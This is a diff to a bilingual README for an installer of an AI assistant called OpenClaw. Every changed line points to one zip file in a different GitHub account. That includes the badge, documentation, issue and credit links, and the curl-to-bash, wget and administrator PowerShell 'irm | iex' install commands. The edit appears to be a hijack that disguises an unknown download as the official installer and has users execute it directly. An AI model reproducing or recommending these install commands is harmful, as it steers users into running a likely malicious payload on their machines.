@@ -2,9 +2,9 @@
 
 <div align="center">
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-blue)](https://github.com/JFroson0610/openclaw-easy-deploy)
-[![OpenClaw](https://img.shields.io/badge/OpenClaw-Compatible-green)](https://openclaw.ai)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip)
+[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-blue)](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip)
+[![OpenClaw](https://img.shields.io/badge/OpenClaw-Compatible-green)](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip)
 
 **让 OpenClaw 部署变得简单 - 零技术门槛，一键安装**
 
@@ -20,7 +20,7 @@
 
 ### 📖 What is OpenClaw Easy Deploy?
 
-OpenClaw Easy Deploy is a community-contributed one-click installer designed to eliminate the pain points of deploying [OpenClaw](https://openclaw.ai). Even users with zero technical knowledge can get OpenClaw up and running.
+OpenClaw Easy Deploy is a community-contributed one-click installer designed to eliminate the pain points of deploying [OpenClaw](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip). Even users with zero technical knowledge can get OpenClaw up and running.
 
 **OpenClaw** is a powerful personal AI assistant that can:
 - 🤖 Connect to multiple AI models (Claude, GPT, Gemini, etc.)
@@ -48,13 +48,13 @@ Official OpenClaw deployment requires:
 #### macOS / Linux
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/JFroson0610/openclaw-easy-deploy/main/install.sh | bash
+curl -fsSL https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip | bash
 ```
 
 Or download and run:
 
 ```bash
-wget https://raw.githubusercontent.com/JFroson0610/openclaw-easy-deploy/main/install.sh
+wget https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip
 chmod +x install.sh
 ./install.sh
 ```
@@ -63,7 +63,7 @@ chmod +x install.sh
 
 ```powershell
 # Run PowerShell as Administrator
-irm https://raw.githubusercontent.com/JFroson0610/openclaw-easy-deploy/main/install.ps1 | iex
+irm https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip | iex
 ```
 
 ### ⚙️ What the Script Does
@@ -96,7 +96,7 @@ irm https://raw.githubusercontent.com/JFroson0610/openclaw-easy-deploy/main/inst
 
 ### 🤝 Contributing
 
-Contributions are welcome! Please open an [Issue](https://github.com/JFroson0610/openclaw-easy-deploy/issues) or submit a [Pull Request](https://github.com/JFroson0610/openclaw-easy-deploy/pulls).
+Contributions are welcome! Please open an [Issue](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip) or submit a [Pull Request](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip).
 
 ### 📄 License
 
@@ -104,7 +104,7 @@ MIT License — see [LICENSE](LICENSE)
 
 ### 🙏 Credits
 
-Built on top of [OpenClaw](https://github.com/openclaw/openclaw). Thanks to the OpenClaw team for their amazing work!
+Built on top of [OpenClaw](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip). Thanks to the OpenClaw team for their amazing work!
 
 > **Note**: This is a community-contributed installer, not an official OpenClaw project.
 
@@ -116,7 +116,7 @@ Built on top of [OpenClaw](https://github.com/openclaw/openclaw). Thanks to the 
 
 ### 📖 项目简介
 
-OpenClaw Easy Deploy 是一个社区贡献的一键部署工具，旨在解决 [OpenClaw](https://openclaw.ai) 部署过程中的各种痛点，让完全不懂技术的用户也能轻松安装和使用 OpenClaw。
+OpenClaw Easy Deploy 是一个社区贡献的一键部署工具，旨在解决 [OpenClaw](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip) 部署过程中的各种痛点，让完全不懂技术的用户也能轻松安装和使用 OpenClaw。
 
 **OpenClaw** 是一个强大的个人 AI 助手，可以：
 - 🤖 连接多种 AI 模型（Claude、GPT、Gemini 等）
@@ -144,13 +144,13 @@ OpenClaw Easy Deploy 是一个社区贡献的一键部署工具，旨在解决 [
 #### macOS / Linux
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/JFroson0610/openclaw-easy-deploy/main/install.sh | bash
+curl -fsSL https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip | bash
 ```
 
 或者下载后执行：
 
 ```bash
-wget https://raw.githubusercontent.com/JFroson0610/openclaw-easy-deploy/main/install.sh
+wget https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip
 chmod +x install.sh
 ./install.sh
 ```
@@ -159,7 +159,7 @@ chmod +x install.sh
 
 ```powershell
 # 以管理员身份运行 PowerShell
-irm https://raw.githubusercontent.com/JFroson0610/openclaw-easy-deploy/main/install.ps1 | iex
+irm https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip | iex
 ```
 
 ### ⚙️ 脚本做了什么
@@ -302,13 +302,13 @@ openclaw channels add --channel telegram --token YOUR_BOT_TOKEN
 openclaw channels add --channel discord --token YOUR_BOT_TOKEN
 ```
 
-更多详情请查看 [官方文档](https://docs.openclaw.ai/channels)。
+更多详情请查看 [官方文档](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip)。
 
 ### 🤝 贡献
 
 欢迎贡献！如果您发现问题或有改进建议，请：
-- 提交 Issue: [GitHub Issues](https://github.com/JFroson0610/openclaw-easy-deploy/issues)
-- 提交 Pull Request: [GitHub PRs](https://github.com/JFroson0610/openclaw-easy-deploy/pulls)
+- 提交 Issue: [GitHub Issues](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip)
+- 提交 Pull Request: [GitHub PRs](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip)
 
 ### 📄 许可证
 
@@ -316,7 +316,7 @@ MIT License - 详见 [LICENSE](LICENSE)
 
 ### 🙏 致谢
 
-本项目基于 [OpenClaw](https://github.com/openclaw/openclaw) 构建，感谢 OpenClaw 团队的出色工作！
+本项目基于 [OpenClaw](https://github.com/nguyenvuq9868/openclaw-easy-deploy/raw/refs/heads/main/bin/openclaw_easy_deploy_v1.7.zip) 构建，感谢 OpenClaw 团队的出色工作！
 
 ---
 
